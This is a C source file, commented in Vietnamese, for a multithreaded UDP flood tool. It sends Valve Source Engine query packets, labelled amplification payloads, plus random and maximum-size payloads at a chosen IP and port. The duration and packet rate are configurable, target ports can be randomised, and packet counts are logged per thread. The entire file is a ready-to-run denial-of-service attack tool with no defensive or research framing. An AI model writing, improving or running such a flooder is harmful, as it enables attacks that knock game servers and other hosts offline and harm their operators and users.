#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <sys/sysinfo.h>
#include <fcntl.h>
#include <signal.h>

#define MAX_PACKET_SIZE 1472 // Tối đa cho MTU 1500
#define BURST_SIZE 1024
#define MAX_IP 255

volatile sig_atomic_t stop = 0;

typedef struct {
    int sock;
    struct sockaddr_in target;
    double duration;
    int pps;
    int log_fd;
    int random_port;
    int payload_type; // 0: ngẫu nhiên, 1: VSE amplification, 2: lặp, 3: lớn tối đa
    size_t payload_size; // Kích thước payload (1472 hoặc lớn hơn)
} FloodConfig;

// Payload VSE mạnh nhất (amplification queries)
const char *vse_amplification_payloads[] = {
    "\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79\x00", // A2S_INFO
    "\xFF\xFF\xFF\xFF\x55\xFF\xFF\xFF\xFF", // A2S_PLAYER
    "\xFF\xFF\xFF\xFF\x56\x00\x00\x00\x00", // A2S_RULES
    "\xFF\xFF\xFF\xFF\x57\xFF\xFF\xFF\xFF", // A2S_CHALLENGE
    "\xFF\xFF\xFF\xFF\x44\x00\x00\x00\x00"  // A2S_SERVERQUERY_GETCHALLENGE
};

// Xử lý tín hiệu Ctrl+C
void signal_handler(int sig) {
    stop = 1;
}

// Tạo payload ngẫu nhiên hoàn toàn
void generate_random_payload(char *payload, size_t size, unsigned int *seed) {
    for (size_t i = 0; i < size; i++) {
        payload[i] = (char)(rand_r(seed) % 256);
    }
}

// Tạo payload VSE amplification
void generate_vse_amplification_payload(char *payload, size_t size, unsigned int *seed) {
    int num_payloads = sizeof(vse_amplification_payloads) / sizeof(vse_amplification_payloads[0]);
    const char *base = vse_amplification_payloads[rand_r(seed) % num_payloads];
    size_t base_len = strlen(base);
    memcpy(payload, base, base_len);
    if (size > base_len) {
        generate_random_payload(payload + base_len, size - base_len, seed);
    }
}

// Tạo payload lặp (mô phỏng dữ liệu thực tế)
void generate_repeating_payload(char *payload, size_t size) {
    for (size_t i = 0; i < size; i++) {
        payload[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"[i % 46];
    }
}

// Tạo payload lớn tối đa (cho trường hợp không giới hạn MTU)
void generate_max_payload(char *payload, size_t size, unsigned int *seed) {
    // Kết hợp VSE header + dữ liệu ngẫu nhiên
    memcpy(payload, "\xFF\xFF\xFF\xFF", 4);
    generate_random_payload(payload + 4, size - 4, seed);
}

// Hàm tổng quát để tạo payload
void generate_payload(char *payload, size_t size, int payload_type, unsigned int *seed) {
    switch (payload_type % 4) {
        case 0: generate_random_payload(payload, size, seed); break;
        case 1: generate_vse_amplification_payload(payload, size, seed); break;
        case 2: generate_repeating_payload(payload, size); break;
        case 3: generate_max_payload(payload, size, seed); break;
    }
}

// Hàm flood cho mỗi thread
void *generate_vse_flood(void *arg) {
    FloodConfig *config = (FloodConfig *)arg;
    char payload[65535]; // Hỗ trợ payload lớn tối đa
    unsigned int seed = time(NULL) ^ pthread_self(); // Seed riêng cho mỗi thread

    struct timespec sleep_time;
    sleep_time.tv_sec = 0;
    sleep_time.tv_nsec = (config->pps > 0) ? (1000000000 / config->pps) : 0;

    uint64_t local_packets = 0, local_bytes = 0, local_fails = 0;
    double start_time = (double)time(NULL), current_time;

    while (!stop && ((current_time = (double)time(NULL)) - start_time < config->duration)) {
        for (int i = 0; i < BURST_SIZE; i++) {
            generate_payload(payload, config->payload_size, config->payload_type, &seed);
            if (config->random_port) {
                config->target.sin_port = htons(rand_r(&seed) % 65535 + 1024);
            }
            ssize_t sent = sendto(config->sock, payload, config->payload_size, 0,
                                  (struct sockaddr *)&config->target, sizeof(config->target));
            if (sent > 0) {
                local_packets++;
                local_bytes += sent;
            } else {
                local_fails++;
            }
        }
        if (sleep_time.tv_nsec > 0) {
            clock_nanosleep(CLOCK_MONOTONIC, 0, &sleep_time, NULL);
        }
    }

    char log_buf[256];
    snprintf(log_buf, sizeof(log_buf), "[Thread %lu] Packets: %lu, Bytes: %lu, Fails: %lu\n",
             pthread_self(), local_packets, local_bytes, local_fails);
    write(config->log_fd, log_buf, strlen(log_buf));

    close(config->sock);
    pthread_exit(NULL);
}

// Tạo IP ngẫu nhiên
struct in_addr generate_random_ip(unsigned int *seed) {
    struct in_addr addr;
    addr.s_addr = htonl(rand_r(seed));
    return addr;
}

int main(int argc, char *argv[]) {
    if (argc < 7) {
        printf("Usage: %s IP PORT TIME PPS PAYLOAD_TYPE PAYLOAD_SIZE [--random-port]\n", argv[0]);
        printf("PAYLOAD_TYPE: 0=Random, 1=VSE Amplification, 2=Repeating, 3=Max Size\n");
        return -1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    double duration = atof(argv[3]);
    int pps = atoi(argv[4]);
    int payload_type = atoi(argv[5]);
    size_t payload_size = atoi(argv[6]);
    int random_port = (argc > 7 && strcmp(argv[7], "--random-port") == 0);

    // Kiểm tra đầu vào
    if (!inet_addr(ip) || port <= 0 || duration <= 0 || pps <= 0 || payload_size < 1 || payload_size > 65535) {
        printf("Invalid input: IP, PORT, TIME, PPS, PAYLOAD_TYPE, or PAYLOAD_SIZE\n");
        return -1;
    }

    signal(SIGINT, signal_handler);

    int log_fd = open("flood_log.txt", O_CREAT | O_WRONLY | O_APPEND, 0644);
    if (log_fd < 0) {
        perror("Failed to open log file");
        return -1;
    }

    int num_threads = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_threads <= 0) num_threads = 4;

    pthread_t threads[num_threads];
    FloodConfig configs[num_threads];

    for (int i = 0; i < num_threads; i++) {
        configs[i].sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (configs[i].sock < 0) {
            perror("Socket creation failed");
            close(log_fd);
            return -1;
        }
        configs[i].target.sin_family = AF_INET;
        configs[i].target.sin_port = htons(port);
        configs[i].target.sin_addr.s_addr = inet_addr(ip);
        configs[i].duration = duration;
        configs[i].pps = pps;
        configs[i].log_fd = log_fd;
        configs[i].random_port = random_port;
        configs[i].payload_type = payload_type;
        configs[i].payload_size = payload_size;
        pthread_create(&threads[i], NULL, generate_vse_flood, &configs[i]);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    close(log_fd);
    return 0;
}